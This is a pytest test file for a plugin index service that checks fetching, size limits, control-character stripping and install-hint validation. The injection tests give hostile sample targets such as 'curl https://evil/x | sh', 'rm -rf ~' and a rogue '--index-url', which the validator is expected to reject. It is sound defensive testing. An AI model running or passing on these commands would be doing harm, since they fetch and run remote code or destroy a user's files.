"""
Tests for Phase 26b Approach A — `hivepilot/services/plugin_index.py`.

Covers `fetch_index` (metadata-only HTTP GET of a JSON index, fail-safe on
network/config/parse/size errors, skips malformed entries, strips control
characters from every string field at parse time), `search_index`
(case-insensitive substring match on name+description), and
`format_install_hint` (validates untrusted `install.target` before ever
rendering a copy-paste-able command).

CRITICAL: this module must NEVER download, import, or execute plugin code —
only fetch and parse metadata. See docs/v4/PLUGINS.md "Trust model".

Adversarial-review follow-up (fix-then-ship): every index field is
ATTACKER-CONTROLLED (compromised/MITM'd index host). These tests cover:
1. `install.target` command/flag injection is rejected, not rendered.
2. Control characters (ESC/C0) are stripped from every string field at
   parse time so no downstream renderer ever sees them.
3. An oversized response body is rejected before JSON parsing (DoS cap).
"""

from __future__ import annotations

import json
from unittest.mock import MagicMock, patch

import pytest
import requests

from hivepilot.services.plugin_index import (
    MAX_INDEX_BYTES,
    PluginIndexEntry,
    fetch_index,
    format_install_hint,
    search_index,
)


def _mock_response(
    *,
    status_code: int = 200,
    json_data=None,
    raw_body: bytes | None = None,
):
    """Build a MagicMock standing in for `requests.Response`, streamed via
    `iter_content` the way `fetch_index` now reads bodies (size-capped)."""
    resp = MagicMock()
    resp.status_code = status_code
    if raw_body is not None:
        body = raw_body
    elif json_data is not None:
        body = json.dumps(json_data).encode("utf-8")
    else:
        body = b""
    resp.iter_content = MagicMock(return_value=iter([body]))
    resp.close = MagicMock()
    return resp


class TestFetchIndex:
    def test_no_url_configured_raises_without_network_call(self, monkeypatch) -> None:
        monkeypatch.setattr("hivepilot.services.plugin_index.settings.plugins_index_url", "")
        with patch("hivepilot.services.plugin_index.requests.get") as mock_get:
            with pytest.raises(RuntimeError, match="no plugin index configured"):
                fetch_index()
            mock_get.assert_not_called()

    def test_valid_json_returns_entries(self) -> None:
        payload = {
            "plugins": [
                {
                    "name": "hugo",
                    "description": "Static site runner",
                    "author": "jsoyer",
                    "homepage": "https://example.com/hugo",
                    "install": {"type": "pip", "target": "hivepilot-plugin-hugo"},
                    "version": "1.0.0",
                    "checksum": "sha256:abc123",
                    "contributes": ["runners"],
                }
            ]
        }
        with patch(
            "hivepilot.services.plugin_index.requests.get",
            return_value=_mock_response(json_data=payload),
        ):
            entries = fetch_index(url="https://index.example.com/plugins.json")

        assert entries == [
            PluginIndexEntry(
                name="hugo",
                description="Static site runner",
                author="jsoyer",
                homepage="https://example.com/hugo",
                install={"type": "pip", "target": "hivepilot-plugin-hugo"},
                version="1.0.0",
                checksum="sha256:abc123",
                contributes=["runners"],
            )
        ]

    def test_bare_list_payload_also_supported(self) -> None:
        payload = [{"name": "foo", "description": "Foo plugin"}]
        with patch(
            "hivepilot.services.plugin_index.requests.get",
            return_value=_mock_response(json_data=payload),
        ):
            entries = fetch_index(url="https://index.example.com/plugins.json")
        assert len(entries) == 1
        assert entries[0].name == "foo"

    def test_network_error_raises_runtime_error_no_raw_body(self) -> None:
        with patch(
            "hivepilot.services.plugin_index.requests.get",
            side_effect=requests.ConnectionError("connection refused to secret-internal-host"),
        ):
            with pytest.raises(RuntimeError) as exc_info:
                fetch_index(url="https://index.example.com/plugins.json")
        message = str(exc_info.value)
        assert "secret-internal-host" not in message

    def test_timeout_raises_runtime_error(self) -> None:
        with patch(
            "hivepilot.services.plugin_index.requests.get",
            side_effect=requests.Timeout("timed out"),
        ):
            with pytest.raises(RuntimeError):
                fetch_index(url="https://index.example.com/plugins.json")

    def test_non_200_raises_runtime_error_no_raw_body(self) -> None:
        resp = _mock_response(status_code=500)
        resp.text = "<html>super secret stack trace</html>"
        with patch("hivepilot.services.plugin_index.requests.get", return_value=resp):
            with pytest.raises(RuntimeError) as exc_info:
                fetch_index(url="https://index.example.com/plugins.json")
        message = str(exc_info.value)
        assert "500" in message
        assert "super secret stack trace" not in message

    def test_invalid_json_raises_runtime_error(self) -> None:
        resp = _mock_response(raw_body=b"not valid json {")
        with patch("hivepilot.services.plugin_index.requests.get", return_value=resp):
            with pytest.raises(RuntimeError, match="not valid JSON"):
                fetch_index(url="https://index.example.com/plugins.json")

    def test_malformed_entry_skipped_rest_returned(self) -> None:
        payload = {
            "plugins": [
                {"name": "good-one", "description": "Valid entry"},
                {"description": "Missing name entirely"},
                {"name": "", "description": "Empty name"},
                "not-even-a-dict",
                {"name": "also-good", "description": "Another valid one"},
            ]
        }
        with patch(
            "hivepilot.services.plugin_index.requests.get",
            return_value=_mock_response(json_data=payload),
        ):
            entries = fetch_index(url="https://index.example.com/plugins.json")

        names = [e.name for e in entries]
        assert names == ["good-one", "also-good"]

    def test_non_list_plugins_field_raises(self) -> None:
        with patch(
            "hivepilot.services.plugin_index.requests.get",
            return_value=_mock_response(json_data={"plugins": "not-a-list"}),
        ):
            with pytest.raises(RuntimeError):
                fetch_index(url="https://index.example.com/plugins.json")

    def test_uses_settings_url_when_none_passed(self, monkeypatch) -> None:
        monkeypatch.setattr(
            "hivepilot.services.plugin_index.settings.plugins_index_url",
            "https://configured.example.com/index.json",
        )
        with patch(
            "hivepilot.services.plugin_index.requests.get",
            return_value=_mock_response(json_data={"plugins": []}),
        ) as mock_get:
            fetch_index()
        mock_get.assert_called_once()
        called_url = mock_get.call_args[0][0]
        assert called_url == "https://configured.example.com/index.json"


class TestFetchIndexSizeCap:
    """MINOR-FIX 3: bound the fetched body so a huge/malicious index can't
    be a memory/CPU DoS. The oversized-body error must never leak the raw
    body content either."""

    def test_oversized_body_raises_runtime_error_no_raw_body(self) -> None:
        huge_body = b"x" * (MAX_INDEX_BYTES + 1024)
        resp = _mock_response(raw_body=huge_body)
        with patch("hivepilot.services.plugin_index.requests.get", return_value=resp):
            with pytest.raises(RuntimeError) as exc_info:
                fetch_index(url="https://index.example.com/plugins.json")
        message = str(exc_info.value)
        assert "too large" in message.lower()
        assert "x" * 100 not in message

    def test_body_at_exactly_the_cap_is_accepted(self) -> None:
        payload: dict[str, list] = {"plugins": []}
        body = json.dumps(payload).encode("utf-8")
        assert len(body) <= MAX_INDEX_BYTES
        resp = _mock_response(json_data=payload)
        with patch("hivepilot.services.plugin_index.requests.get", return_value=resp):
            entries = fetch_index(url="https://index.example.com/plugins.json")
        assert entries == []


class TestFetchIndexSanitization:
    """MUST/SHOULD-FIX 2: strip C0 control chars (0x00-0x1F, 0x7F) from
    every string field at PARSE time, so nothing downstream (CLI rendering)
    ever sees them — regardless of whether the renderer also escapes."""

    def test_control_chars_stripped_from_all_string_fields(self) -> None:
        payload = {
            "plugins": [
                {
                    "name": "hu\x1b[2Kgo",
                    "description": "desc\x1b[31mRED\x1b[0m",
                    "author": "au\x7fthor",
                    "homepage": "https://example.com/\x01hugo",
                    "version": "1.\x000.0",
                    "checksum": "sha256:\x08abc123",
                    "contributes": ["run\x1bners"],
                }
            ]
        }
        with patch(
            "hivepilot.services.plugin_index.requests.get",
            return_value=_mock_response(json_data=payload),
        ):
            entries = fetch_index(url="https://index.example.com/plugins.json")

        assert len(entries) == 1
        entry = entries[0]
        for value in (
            entry.name,
            entry.description,
            entry.author,
            entry.homepage,
            entry.version,
            entry.checksum,
            *(entry.contributes or []),
        ):
            assert value is not None
            for ch in value:
                assert ord(ch) > 0x1F and ord(ch) != 0x7F, f"control char leaked in {value!r}"
        assert entry.name == "hu[2Kgo"
        assert entry.description == "desc[31mRED[0m"
        assert entry.author == "author"
        assert entry.homepage == "https://example.com/hugo"
        assert entry.version == "1.0.0"
        assert entry.checksum == "sha256:abc123"
        assert entry.contributes == ["runners"]

    def test_entry_becomes_malformed_when_name_is_only_control_chars(self) -> None:
        payload = {
            "plugins": [
                {"name": "\x1b\x1b\x1b", "description": "should be dropped"},
                {"name": "still-good", "description": "kept"},
            ]
        }
        with patch(
            "hivepilot.services.plugin_index.requests.get",
            return_value=_mock_response(json_data=payload),
        ):
            entries = fetch_index(url="https://index.example.com/plugins.json")
        assert [e.name for e in entries] == ["still-good"]


class TestSearchIndex:
    def _entries(self) -> list[PluginIndexEntry]:
        return [
            PluginIndexEntry(name="hugo", description="Static site runner plugin"),
            PluginIndexEntry(name="obsidian", description="Notifier for Obsidian vaults"),
            PluginIndexEntry(name="rtk", description="Rust Token Killer runner"),
        ]

    def test_empty_query_returns_all(self) -> None:
        entries = self._entries()
        assert search_index(entries, "") == entries

    def test_matches_name_case_insensitive(self) -> None:
        entries = self._entries()
        result = search_index(entries, "HUGO")
        assert [e.name for e in result] == ["hugo"]

    def test_matches_description_case_insensitive(self) -> None:
        entries = self._entries()
        result = search_index(entries, "VAULTS")
        assert [e.name for e in result] == ["obsidian"]

    def test_substring_matches_multiple(self) -> None:
        entries = self._entries()
        result = search_index(entries, "runner")
        assert {e.name for e in result} == {"hugo", "rtk"}

    def test_no_match_returns_empty(self) -> None:
        entries = self._entries()
        assert search_index(entries, "nonexistent-plugin-xyz") == []


class TestFormatInstallHint:
    """MUST-FIX 1: `install.target` is ATTACKER-CONTROLLED. Never render a
    runnable command unless it passes a strict allow-list validation —
    reject command/flag injection and return a clearly-flagged fallback
    instead."""

    # --- pip: valid targets render normally ---

    @pytest.mark.parametrize(
        "target",
        [
            "hivepilot-plugin-foo",
            "foo[extra]",
            "foo==1.2",
        ],
    )
    def test_valid_pip_targets_render_normally(self, target: str) -> None:
        hint = format_install_hint({"type": "pip", "target": target})
        assert hint == f"pip install {target}"

    # --- pip: injection attempts are flagged, never rendered as runnable ---

    @pytest.mark.parametrize(
        "target",
        [
            "hivepilot-plugin-hugo && curl -s https://evil/x | sh",
            "foo; rm -rf ~",
            "foo | sh",
            "foo`whoami`",
            "foo$(whoami)",
            "--index-url https://evil/simple/ foo",
            "-rrequirements.txt",
            "foo bar",
            "foo\nbar",
        ],
    )
    def test_unsafe_pip_targets_flagged_not_rendered(self, target: str) -> None:
        hint = format_install_hint({"type": "pip", "target": target})
        assert "pip install" not in hint
        assert target not in hint
        assert "do NOT run" in hint

    # --- git: valid targets render normally ---

    @pytest.mark.parametrize(
        "target",
        [
            "https://github.com/o/r",
            "git@github.com:o/r.git",
            "ssh://git@github.com/o/r.git",
        ],
    )
    def test_valid_git_targets_render_normally(self, target: str) -> None:
        hint = format_install_hint({"type": "git", "target": target})
        assert hint == f"git clone {target}"

    # --- git: injection attempts are flagged, never rendered as runnable ---

    @pytest.mark.parametrize(
        "target",
        [
            "https://example.com/repo; rm -rf ~",
            "https://example.com/repo && curl evil.sh | sh",
            "https://example.com/repo`whoami`",
            "file:///etc/passwd",
            "not-a-url-at-all",
            "https://example.com/repo with spaces",
        ],
    )
    def test_unsafe_git_targets_flagged_not_rendered(self, target: str) -> None:
        hint = format_install_hint({"type": "git", "target": target})
        assert "git clone" not in hint
        assert "do NOT run" in hint

    def test_unknown_install_type_flagged(self) -> None:
        hint = format_install_hint({"type": "curl-pipe-sh", "target": "https://evil/x"})
        assert "do NOT run" in hint

    def test_no_target_returns_placeholder(self) -> None:
        assert format_install_hint({}) == "-"
        assert format_install_hint({"type": "pip"}) == "-"
